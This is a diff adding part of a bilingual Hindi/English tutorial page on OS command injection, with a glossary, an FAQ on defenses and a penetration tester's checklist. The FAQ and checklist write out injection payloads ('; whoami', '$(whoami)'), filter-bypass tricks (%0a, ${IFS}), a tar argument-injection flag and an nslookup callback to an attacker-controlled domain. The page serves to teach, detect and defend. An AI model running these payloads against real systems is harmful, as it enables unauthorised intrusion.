+          <span class="lang-en">A technique that forces the target server to send a DNS/HTTP request to a domain controlled by the attacker — if that request is received, it confirms the injection is working, even if nothing shows up in the HTTP response.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">08</span> Allowlist vs Blacklist</div>
+        <div class="glossary-def">
+          <span class="lang-hi"><code>Blacklist</code> sirf "known-bad" cheezein block karti hai (hamesha kuch chhoot jaata hai). <code>Allowlist</code> ulta approach hai — sirf "known-good" format ko accept karti hai, baaki SAB reject — isliye zyada robust maani jaati hai.</span>
+          <span class="lang-en">A <code>Blacklist</code> only blocks "known-bad" things (something always slips through). An <code>Allowlist</code> is the reverse approach — it only accepts a "known-good" format, rejecting EVERYTHING else — which is why it's considered more robust.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">09</span> Argument Injection</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek advanced technique jisme attacker koi shell metacharacter use kiye bina, sirf command-line FLAGS (jaise <code>--output=</code>) inject karke underlying program ka behavior change kar deta hai.</span>
+          <span class="lang-en">An advanced technique where the attacker changes the underlying program's behavior by injecting command-line FLAGS (like <code>--output=</code>) — without using any shell metacharacter at all.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">10</span> Principle of Least Privilege</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek security practice jisme har process/user ko sirf UTNI HI permission di jaati hai jitni uska kaam karne ke liye zaroori hai — kam se kam access dene se, agar koi vulnerability exploit ho bhi jaaye, uska impact limited rehta hai.</span>
+          <span class="lang-en">A security practice where every process/user is given ONLY as much permission as is needed to do its job — by minimizing access, even if a vulnerability is exploited, its impact stays limited.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">11</span> Webshell</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek chhota malicious script jo attacker RCE ke through server par upload kar deta hai — ye use browser se hi, baar-baar, seedha server par commands chalane deta hai (persistent access).</span>
+          <span class="lang-en">A small malicious script an attacker uploads to a server via RCE — it lets them keep running commands directly on the server, from a browser, repeatedly (persistent access).</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">12</span> WAF (Web Application Firewall)</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek filter jo web application ke saamne baitha hota hai aur known malicious PATTERNS (jaise <code>;</code>, <code>cat</code>) dekh kar requests block karta hai — ek extra layer hai, primary fix ka substitute nahi.</span>
+          <span class="lang-en">A filter that sits in front of a web application and blocks requests by detecting known malicious PATTERNS (like <code>;</code>, <code>cat</code>) — it's an extra layer, not a substitute for the primary fix.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">13</span> Cloud Metadata Endpoint</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek special internal-only address (<code>169.254.169.254</code>) jo cloud servers (AWS/GCP/Azure) provide karte hain — isse server temporary CLOUD CREDENTIALS aur apni khud ki configuration jaan sakta hai.</span>
+          <span class="lang-en">A special, internal-only address (<code>169.254.169.254</code>) that cloud servers (AWS/GCP/Azure) provide — through it, a server can learn temporary CLOUD CREDENTIALS and its own configuration.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">14</span> Percent/URL Encoding</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek tarika jisse special characters ko <code>%XX</code> format mein represent kiya jaata hai (jaise newline <code>= %0a</code>) taaki wo URL/HTTP request ke andar safely travel kar saken.</span>
+          <span class="lang-en">A way of representing special characters in <code>%XX</code> format (e.g. newline <code>= %0a</code>) so they can safely travel inside a URL/HTTP request.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">15</span> execve() / shell=False</div>
+        <div class="glossary-def">
+          <span class="lang-hi">OS ko directly ek program launch karne ka tarika, ek fixed ARRAY of arguments ke saath — bina kisi shell interpreter ko beech mein laaye. Isi wajah se metacharacters yahan kabhi apna special meaning expand nahi karte.</span>
+          <span class="lang-en">A way to launch a program directly at the OS level, with a fixed ARRAY of arguments — without any shell interpreter in between. This is exactly why metacharacters never expand their special meaning here.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">16</span> CVE</div>
+        <div class="glossary-def">
+          <span class="lang-hi"><strong>Common Vulnerabilities and Exposures</strong> — ek unique ID (jaise <code>CVE-2014-6271</code>) jo kisi publicly-known security vulnerability ko diya jaata hai, taaki security community usse consistently reference kar sake.</span>
+          <span class="lang-en"><strong>Common Vulnerabilities and Exposures</strong> — a unique ID (like <code>CVE-2014-6271</code>) assigned to a publicly-known security vulnerability, so the security community can consistently reference it.</span>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- FAQ -->
+  <section class="faq-section" id="confusing-questions">
+    <div class="faq-header">
+      <h2>🤔 <span class="lang-hi">Confusing Questions</span><span class="lang-en">Confusing Questions</span></h2>
+      <p>
+        <span class="lang-hi">Ye wo sawaal hain jo Command Injection samajhne ke baad bhi log ghumte rehte hain — expand karke apna concept clear karo.</span>
+        <span class="lang-en">These are the questions people still get confused about even after understanding Command Injection — expand each to clear your concepts.</span>
+      </p>
+    </div>
+
+    <div class="faq-list">
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q1</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Command Injection aur Code Injection mein kya fark hai?</span>
+            <span class="lang-en">What is the difference between Command Injection and Code Injection?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi"><code>Command Injection</code> mein attacker underlying OPERATING SYSTEM shell ko commands inject karta hai (jaise <code>cat</code>, <code>whoami</code>) — target ek OS-level program hota hai. <code>Code Injection</code> mein attacker application ki apni PROGRAMMING LANGUAGE mein hi malicious code inject karta hai (jaise PHP ka <code>eval()</code> function ek user-controlled string ko PHP code ki tarah execute kar de) — target application ka khud ka interpreter/runtime hota hai. Dono ka result RCE ho sakta hai, lekin injection point aur exploited component alag hote hain.</span>
+            <span class="lang-en">In <code>Command Injection</code>, the attacker injects commands into the underlying OPERATING SYSTEM's shell (like <code>cat</code>, <code>whoami</code>) — the target is an OS-level program. In <code>Code Injection</code>, the attacker injects malicious code into the application's own PROGRAMMING LANGUAGE (like PHP's <code>eval()</code> function executing a user-controlled string as PHP code) — the target is the application's own interpreter/runtime. Both can result in RCE, but the injection point and exploited component differ.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q2</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">SQL Injection aur Command Injection ka mechanism same hai kya?</span>
+            <span class="lang-en">Is the mechanism of SQL Injection and Command Injection the same?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Conceptually bahut similar hain — dono mein hi ROOT CAUSE ye hai ki user input ko ek "interpreted language" (SQL query ya shell command) ke saath UNTRUSTED string ki tarah concatenate kiya gaya, aur wo interpreter data aur code ke beech ka fark nahi kar paaya. Lekin target alag hai: SQLi database engine ko exploit karta hai, Command Injection OS shell ko. Fix bhi structurally similar hai — SQLi mein <code>parameterized queries</code> use hote hain, Command Injection mein <code>no-shell array-based execution</code> — dono hi approach "interpreter ko ek hi trusted string dikhao, user data ko alag rakho" wale principle par based hain.</span>
+            <span class="lang-en">Conceptually they are very similar — in both, the ROOT CAUSE is that user input was concatenated as an untrusted string into an "interpreted language" (a SQL query or a shell command), and that interpreter couldn't distinguish between data and code. But the target differs: SQLi exploits the database engine, Command Injection exploits the OS shell. The fix is also structurally similar — SQLi uses <code>parameterized queries</code>, Command Injection uses <code>no-shell array-based execution</code> — both approaches are based on the principle of "show the interpreter only the trusted structure, keep user data separate".</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q3</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Blind Command Injection ko practically kaise detect karte hain?</span>
+            <span class="lang-en">How do you practically detect Blind Command Injection?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Do main techniques hain. Pehli, <code>Time-based detection</code>: payload mein <code>; sleep 10</code> jaisa command daalo — agar response consistently ~10 second late aata hai (baseline request se compare karke), to confirm ho jaata hai command execute hui. Doosri, <code>Out-of-Band (OAST) detection</code>: payload mein aisi command daalo jo server se attacker ke control kiye hue domain ko DNS/HTTP callback bhejwaye (e.g. <code>; nslookup attacker.oastify.com</code>) — agar wo callback receive hota hai (Burp Collaborator ya interactsh jaise tool mein), to injection confirmed, chahe HTTP response mein kuch bhi na dikhe.</span>
+            <span class="lang-en">There are two main techniques. First, <code>Time-based detection</code>: insert a command like <code>; sleep 10</code> in the payload — if the response is consistently ~10 seconds late (compared to a baseline request), it confirms the command executed. Second, <code>Out-of-Band (OAST) detection</code>: insert a command that makes the server send a DNS/HTTP callback to an attacker-controlled domain (e.g. <code>; nslookup attacker.oastify.com</code>) — if that callback is received (in a tool like Burp Collaborator or interactsh), the injection is confirmed, even if nothing shows up in the HTTP response.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q4</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Kya quotes mein input wrap karna hamesha Command Injection ko rok deta hai?</span>
+            <span class="lang-en">Does wrapping input in quotes always prevent Command Injection?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Nahi. Jaisa Level 3 mein dikhaya gaya, POSIX shell mein DOUBLE-QUOTES sirf <code>;</code>, <code>|</code>, <code>&</code>, aur whitespace ko neutralize karte hain — lekin <code>$variable</code>, backtick <code>` `</code> substitution, aur <code>$()</code> command substitution ko nahi (ye dono hi quotes ke andar bhi expand hote hain). SINGLE-QUOTES ('...') zyada strict hote hain aur almost sab kuch literal treat karte hain — lekin fir bhi ye ek "escaping" approach hai, jo language-specific aur error-prone hoti hai. Isliye quoting ko primary defense ki tarah rely nahi karna chahiye — no-shell execution hi robust solution hai.</span>
+            <span class="lang-en">No. As shown in Level 3, in a POSIX shell DOUBLE-QUOTES only neutralize <code>;</code>, <code>|</code>, <code>&</code>, and whitespace — but not <code>$variable</code>, backtick <code>` `</code> substitution, or <code>$()</code> command substitution (both of these still expand even inside quotes). SINGLE-QUOTES ('...') are stricter and treat almost everything literally — but this is still an "escaping" approach, which is language-specific and error-prone. Quoting should therefore not be relied on as a primary defense — no-shell execution is the robust solution.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q5</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Kya bina kisi shell metacharacter ke bhi Command Injection ho sakti hai?</span>
+            <span class="lang-en">Can Command Injection happen even without any shell metacharacter?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Haan — ise <code>Argument Injection</code> kehte hain. Agar application <code>shell=False</code> use kar rahi hai (koi shell parsing nahi) lekin user input ko ek COMMAND-LINE FLAG ki tarah treat hone deti hai (jaise input ek <code>-</code> se start ho sakta hai), to attacker underlying program ke apne flags misuse kar sakta hai — jaise <code>tar</code> command mein <code>--checkpoint-action=exec=sh\ script.sh</code> jaisa flag inject karke arbitrary command execute karwa dena, bina kisi shell metacharacter ke. Fix: input ko strictly validate karo taaki wo kabhi <code>-</code> se start na ho, ya program ko explicitly batao ki "isse aage sab positional arguments hain" (jaise <code>--</code> separator use karke).</span>
+            <span class="lang-en">Yes — this is called <code>Argument Injection</code>. If an application uses <code>shell=False</code> (no shell parsing) but allows user input to be treated as a COMMAND-LINE FLAG (e.g. the input can start with a <code>-</code>), an attacker can abuse the underlying program's own flags — for example, injecting a flag like <code>--checkpoint-action=exec=sh\ script.sh</code> into a <code>tar</code> command to get arbitrary command execution, without any shell metacharacter at all. Fix: strictly validate that input can never start with <code>-</code>, or explicitly tell the program "everything after this is positional arguments" (e.g. using a <code>--</code> separator).</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q6</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">OS Command Injection aur File Inclusion (LFI/RFI) mein kya fark hai?</span>
+            <span class="lang-en">What is the difference between OS Command Injection and File Inclusion (LFI/RFI)?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Command Injection mein attacker directly OS SHELL ko commands execute karwata hai. Local/Remote File Inclusion (LFI/RFI) mein attacker application ko ek attacker-controlled FILE ko apne code ki tarah LOAD/INTERPRET karwata hai (jaise PHP ka <code>include($_GET['page'])</code> agar validated na ho) — RCE tab hoti hai jab wo included file mein attacker ka executable code (webshell) ho. Dono hi RCE tak le ja sakte hain, lekin mechanism alag hai: ek shell-level command execution hai, doosra application-level file interpretation.</span>
+            <span class="lang-en">In Command Injection, the attacker gets the OS SHELL to directly execute commands. In Local/Remote File Inclusion (LFI/RFI), the attacker gets the application to LOAD/INTERPRET an attacker-controlled FILE as its own code (e.g. PHP's <code>include($_GET['page'])</code> if unvalidated) — RCE occurs when that included file contains the attacker's executable code (a webshell). Both can lead to RCE, but the mechanism differs: one is shell-level command execution, the other is application-level file interpretation.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q7</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Kya sirf input validation (bina allowlist) hi Command Injection ko fully rok sakti hai?</span>
+            <span class="lang-en">Can input validation alone (without an allowlist) fully prevent Command Injection?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Nahi, agar wo validation BLACKLIST-based hai. Jaisa Level 2 mein dikhaya, blacklist mein hamesha kuch character/technique chhoot jaata hai (newline, backtick, $IFS, encoding tricks). ALLOWLIST-based validation (jaise "sirf digits aur dots allowed") zyada robust hai kyunki wo sirf EXPECTED format accept karti hai, baaki sab REJECT. Lekin sabse strongest defense tab banti hai jab strict allowlist ko NO-SHELL EXECUTION (execve-style array arguments) ke saath combine kiya jaaye — dono layers milkar defense-in-depth banati hain.</span>
+            <span class="lang-en">No, if that validation is BLACKLIST-based. As shown in Level 2, a blacklist always misses some character/technique (newline, backtick, $IFS, encoding tricks). ALLOWLIST-based validation (e.g. "only digits and dots allowed") is more robust because it only accepts the EXPECTED format, rejecting everything else. But the strongest defense is achieved when strict allowlisting is combined with NO-SHELL EXECUTION (execve-style array arguments) — both layers together form defense-in-depth.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q8</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Kya application ko non-root user se run karna Command Injection ko prevent kar deta hai?</span>
+            <span class="lang-en">Does running the application as a non-root user prevent Command Injection?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Nahi, ye vulnerability ko PREVENT nahi karta — ye sirf uska IMPACT limit karta hai (defense-in-depth ka part hai, primary fix nahi). Agar app root ke bajaye ek restricted, low-privilege user ki tarah chal rahi hai, to attacker ka injected command bhi usi restricted user ke permissions ke saath chalega — jaise wo <code>/etc/shadow</code> read nahi kar payega, ya sensitive system files modify nahi kar payega. Lekin attacker fir bhi application ke apne data (jaise database credentials, session tokens, application source code) tak access pa sakta hai. Isliye <code>Principle of Least Privilege</code> zaroori hai, lekin ye injection ko fix nahi karta — root cause hamesha shell-string construction hi rehta hai.</span>
+            <span class="lang-en">No, this does not PREVENT the vulnerability — it only LIMITS its impact (it's part of defense-in-depth, not the primary fix). If the app runs as a restricted, low-privilege user instead of root, the attacker's injected command will also run with that same restricted user's permissions — so it won't be able to read <code>/etc/shadow</code> or modify sensitive system files. But the attacker can still access the application's own data (like database credentials, session tokens, application source code). So the <code>Principle of Least Privilege</code> is important, but it doesn't fix the injection — the root cause always remains the shell-string construction.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q9</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Python ke subprocess mein <code>shell=True</code> aur <code>shell=False</code> ka fark kya hai, aur ye kyu matter karta hai?</span>
+            <span class="lang-en">What is the difference between <code>shell=True</code> and <code>shell=False</code> in Python's subprocess, and why does it matter?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi"><code>shell=True</code> ka matlab hai command ko <code>/bin/sh</code> (ek shell interpreter) ke through run kiya jaayega — jo poori string ko parse karega, metacharacters expand karega, aur multiple commands chain karne ki permission dega. <code>shell=False</code> (jo Python mein DEFAULT bhi hai) ka matlab hai command directly OS ko <code>execve()</code> jaisi system call se ARRAY of arguments ki tarah bheja jaata hai — koi shell parsing hoti hi nahi, isliye metacharacters apna special meaning kabhi expand nahi karte. Yahi wajah hai <code>shell=False</code> ke saath array-style arguments use karna Command Injection ka structural fix hai, aur <code>shell=True</code> ke saath string concatenation karna sabse common vulnerability pattern hai.</span>
+            <span class="lang-en"><code>shell=True</code> means the command is run through <code>/bin/sh</code> (a shell interpreter) — which parses the whole string, expands metacharacters, and allows chaining multiple commands. <code>shell=False</code> (which is also Python's DEFAULT) means the command is sent directly to the OS via a system call like <code>execve()</code> as an ARRAY of arguments — no shell parsing happens at all, so metacharacters never expand their special meaning. This is exactly why using <code>shell=False</code> with array-style arguments is the structural fix for Command Injection, and using <code>shell=True</code> with string concatenation is the most common vulnerability pattern.</span>
+          </p>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">
+          <span class="faq-q-badge">Q10</span>
+          <span class="faq-q-text">
+            <span class="lang-hi">Kya WAF (Web Application Firewall) reliably Command Injection ko rok sakta hai?</span>
+            <span class="lang-en">Can a WAF (Web Application Firewall) reliably stop Command Injection?</span>
+          </span>
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>
+            <span class="lang-hi">Ek WAF known malicious PATTERNS (jaise <code>;</code>, <code>|</code>, <code>cat</code>, <code>whoami</code>) ko detect karke request block kar sakta hai, aur ye ek useful ADDITIONAL layer hai — lekin ye SIGNATURE/pattern-based hoti hai, isliye encoding tricks, obfuscation ($IFS ka use, base64-encoded commands jo baad mein decode+exec hote hain, case variations), ya naye/unknown payloads se bypass ho sakti hai. WAF ko kabhi bhi PRIMARY defense nahi maana jaana chahiye — ye application-level fix (no-shell execution + allowlist validation) ka substitute nahi, sirf ek extra suraksha ki layer hai.</span>
+            <span class="lang-en">A WAF can detect known malicious PATTERNS (like <code>;</code>, <code>|</code>, <code>cat</code>, <code>whoami</code>) and block the request, and this is a useful ADDITIONAL layer — but it is SIGNATURE/pattern-based, so it can be bypassed via encoding tricks, obfuscation (using $IFS, base64-encoded commands that are later decoded+executed), or novel/unknown payloads. A WAF should never be treated as the PRIMARY defense — it is not a substitute for the application-level fix (no-shell execution + allowlist validation), only an extra layer of protection.</span>
+          </p>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- TESTER CHECKLIST -->
+  <section class="checklist" id="tester-checklist" style="margin-top:20px;">
+    <div class="checklist-head"><h2>🔍 <span class="lang-hi">Web Security Tester Checklist</span><span class="lang-en">Web Security Tester Checklist</span></h2></div>
+    <p class="checklist-intro">
+        <span class="lang-hi">Ab tak humne dekha Command Injection kaam kaise karta hai aur ise misconfigure kaise kiya jaata hai. Ek web security tester (VAPT) ke roop mein, kisi bhi real application mein Command Injection dhundhne ke liye ye systematic approach follow ki jaati hai:</span>
+        <span class="lang-en">So far we have seen how Command Injection works and how it gets misconfigured. As a web security tester (VAPT), to find Command Injection in any real application, this systematic approach is followed:</span>
+    </p>
+
+    <div class="audit-card">
+      <h3><span class="lang-hi">1. Command-Executing Functionality Identify Karo</span><span class="lang-en">1. Identify Command-Executing Functionality</span></h3>
+      <div class="check-list">
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Features dhundo jo underlying OS tools call kar sakti hain — ping/DNS lookup, traceroute, whois, file conversion, image resize, PDF generation, backup/export.</span>
+            <span class="lang-en">Look for features that might call underlying OS tools — ping/DNS lookup, traceroute, whois, file conversion, image resize, PDF generation, backup/export.</span>
+          </div>
+        </label>
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Response time note karo — agar ek "simple" feature unusually slow hai, ho sakta hai wo background mein ek external process spawn kar rahi ho.</span>
+            <span class="lang-en">Note the response time — if a "simple" feature is unusually slow, it might be spawning an external process in the background.</span>
+          </div>
+        </label>
+      </div>
+    </div>
+
+    <div class="audit-card">
+      <h3><span class="lang-hi">2. Basic Injection Test Karo</span><span class="lang-en">2. Test Basic Injection</span></h3>
+      <div class="check-list">
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Input field mein <code>; whoami</code>, <code>| whoami</code>, <code>&& whoami</code>, <code>` whoami `</code>, aur <code>$(whoami)</code> append karke response mein output/behavior change check karo.</span>
+            <span class="lang-en">Append <code>; whoami</code>, <code>| whoami</code>, <code>&& whoami</code>, <code>` whoami `</code>, and <code>$(whoami)</code> to the input field, and check for output/behavior change in the response.</span>
+          </div>
+        </label>
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Error messages carefully padho — kabhi kabhi shell errors (jaise "sh: whoami: not found") leak ho jaate hain jo confirm karte hain ki input shell tak pahunch raha hai.</span>
+            <span class="lang-en">Read error messages carefully — sometimes shell errors (like "sh: whoami: not found") leak, confirming that the input is reaching the shell.</span>
+          </div>
+        </label>
+      </div>
+    </div>
+
+    <div class="audit-card">
+      <h3><span class="lang-hi">3. Blind Injection Test Karo</span><span class="lang-en">3. Test Blind Injection</span></h3>
+      <div class="check-list">
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Time-based payload try karo (<code>; sleep 10</code>, <code>| ping -c 10 127.0.0.1</code>) aur response delay ko baseline se compare karo.</span>
+            <span class="lang-en">Try a time-based payload (<code>; sleep 10</code>, <code>| ping -c 10 127.0.0.1</code>) and compare the response delay against a baseline.</span>
+          </div>
+        </label>
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Out-of-band (OAST) payload try karo (jaise <code>; nslookup unique-id.oastify.com</code>) aur Burp Collaborator/interactsh par incoming DNS/HTTP callback check karo.</span>
+            <span class="lang-en">Try an out-of-band (OAST) payload (like <code>; nslookup unique-id.oastify.com</code>) and check for an incoming DNS/HTTP callback in Burp Collaborator/interactsh.</span>
+          </div>
+        </label>
+      </div>
+    </div>
+
+    <div class="audit-card">
+      <h3><span class="lang-hi">4. Filter/Encoding Bypass Try Karo</span><span class="lang-en">4. Try Filter/Encoding Bypasses</span></h3>
+      <div class="check-list">
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Common metacharacters block ho to newline (<code>%0a</code>), backtick, aur <code>$()</code> alag-alag try karo.</span>
+            <span class="lang-en">If common metacharacters are blocked, try newline (<code>%0a</code>), backticks, and <code>$()</code> individually.</span>
+          </div>
+        </label>
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">URL encoding, double encoding, aur space ke bajaye <code>${IFS}</code> jaisa substitute try karo.</span>
+            <span class="lang-en">Try URL encoding, double encoding, and using <code>${IFS}</code> as a substitute for spaces.</span>
+          </div>
+        </label>
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Input ko <code>-</code> se start karke Argument Injection test karo (agar shell hi use nahi ho rahi).</span>
+            <span class="lang-en">Test Argument Injection by starting the input with a <code>-</code> (if a shell isn't even being used).</span>
+          </div>
+        </label>
+      </div>
+    </div>
+
+    <div class="audit-card">
+      <h3><span class="lang-hi">5. Impact Aur Severity Document Karo</span><span class="lang-en">5. Document Impact And Severity</span></h3>
+      <div class="check-list">
+        <label class="check-label">
+          <input type="checkbox" class="check-input">
+          <div class="check-box"></div>
+          <div class="check-text">
+            <span class="lang-hi">Confirm ho jaane par, achieved privilege level note karo (jis user se app run ho rahi hai), aur data-at-risk identify karo — ye Critical/High severity RCE finding hoga.</span>
+            <span class="lang-en">Once confirmed, note the achieved privilege level (the user the app runs as), and identify data-at-risk — this will be a Critical/High severity RCE finding.</span>
+          </div>
+        </label>
+      </div>
+    </div>
+  </section>
+
+
+    <!-- ── BOTTOM NAVIGATION ROW ── -->
+  <div class="bottom-nav-row">
+    <a href="XXE.html" class="nav-arrow-btn nav-prev">← 7. XXE</a>
+    <a href="Path_Traversal.html" class="nav-arrow-btn nav-next">9. Path Traversal →</a>
+  </div>
+
+</main>
+
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+
+  var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  window.toggleTheme = function() {
+    var html = document.documentElement;
+    var themeBtn = document.getElementById('themeBtn');
+    if (html.getAttribute('data-theme') === 'dark') {
+      html.setAttribute('data-theme', 'light');
+      if (themeBtn) themeBtn.textContent = '🌙 Dark Mode';
+    } else {
+      html.setAttribute('data-theme', 'dark');
+      if (themeBtn) themeBtn.textContent = '☀️ Light Mode';
+    }
+  };
+
+  window.toggleLanguage = function() {
+    var html = document.documentElement;
+    var toggle = document.getElementById('langToggle');
+    var lblHi = document.getElementById('lbl-hi');
+    var lblEn = document.getElementById('lbl-en');
+
+    if (toggle && toggle.checked) {
+      html.setAttribute('data-lang', 'en');
+      html.setAttribute('lang', 'en');
+      if(lblEn) { lblEn.classList.add('lang-active'); lblEn.classList.remove('lang-inactive'); }
+      if(lblHi) { lblHi.classList.add('lang-inactive'); lblHi.classList.remove('lang-active'); }
+    } else {
+      html.setAttribute('data-lang', 'hi');
+      html.setAttribute('lang', 'hi');
+      if(lblHi) { lblHi.classList.add('lang-active'); lblHi.classList.remove('lang-inactive'); }
+      if(lblEn) { lblEn.classList.add('lang-inactive'); lblEn.classList.remove('lang-active'); }
+    }
+  };
+
+  var themeBtn = document.getElementById('themeBtn');
+  if(themeBtn) themeBtn.addEventListener('click', window.toggleTheme);
+
+  var langToggle = document.getElementById('langToggle');
+  if(langToggle) langToggle.addEventListener('change', window.toggleLanguage);
+
+  document.querySelectorAll('.level-header').forEach(function(header){
+    header.addEventListener('click', function(){
+      var card = header.closest('.level-card');
+      if(card) {
+        card.classList.toggle('open');
+      }
+    });
+  });
+
+  document.querySelectorAll('.faq-question').forEach(function(btn) {
+    btn.addEventListener('click', function() {
+      var item = this.closest('.faq-item');
+      item.classList.toggle('active');
+    });
+  });
+
+  /* ---------- Sub-Nav Smooth Scroll & Active Highlight (Pixel-Perfect Offset) ---------- */
+  var subNavBtns = document.querySelectorAll('.sub-nav-btn');
+  
+  subNavBtns.forEach(function(link){
+    link.addEventListener('click', function(e){
+      var href = link.getAttribute('href');
+      if(href && href.startsWith('#')){
+        e.preventDefault();
+        var targetEl = document.querySelector(href);
+        if(targetEl){
+          var topbar = document.querySelector('.topbar');
+          var totalStickyOffset = (topbar ? topbar.offsetHeight : 50) + 4;
+          var elementPosition = targetEl.getBoundingClientRect().top;
+          var offsetPosition = elementPosition + window.pageYOffset - totalStickyOffset;
+
+          window.scrollTo({
+            top: offsetPosition,
+            behavior: reduceMotion ? 'auto' : 'smooth'
+          });
+        }
+      }
+    });
+  });
+
+  /* ---------- Hero CTA & Sim-Jump Scroll to Simulator Fix ---------- */
+  document.querySelectorAll('.hero-cta, .sim-jump').forEach(function(btn) {
+    btn.addEventListener('click', function(e) {
+      var href = btn.getAttribute('href');
+      if (href && href.startsWith('#')) {
+        e.preventDefault();
+        var targetEl = document.querySelector(href);
+        if (targetEl) {
+          var topbar = document.querySelector('.topbar');
+          var offset = (topbar ? topbar.offsetHeight : 60) + 16;
+          var elementPosition = targetEl.getBoundingClientRect().top;
+          var offsetPosition = elementPosition + window.pageYOffset - offset;
+          window.scrollTo({
+            top: offsetPosition,
+            behavior: reduceMotion ? 'auto' : 'smooth'
+          });
+        }
+      }
+    });
+  });
+
+  function updateSubNavScrollSpy() {
+    var topbar = document.querySelector('.topbar');
+    var totalStickyOffset = (topbar ? topbar.offsetHeight : 50) + 20;
+    var scrollPos = window.scrollY + totalStickyOffset;
+    
+    // Page section IDs corresponding to subnav links in DOM order:
+    var navIds = ['impact', 'code-fixes', 'simulator', 'confusing-questions', 'tester-checklist'];
+    var currentActive = null;
+    
+    for (var i = 0; i < navIds.length; i++) {
+      var sec = document.getElementById(navIds[i]);
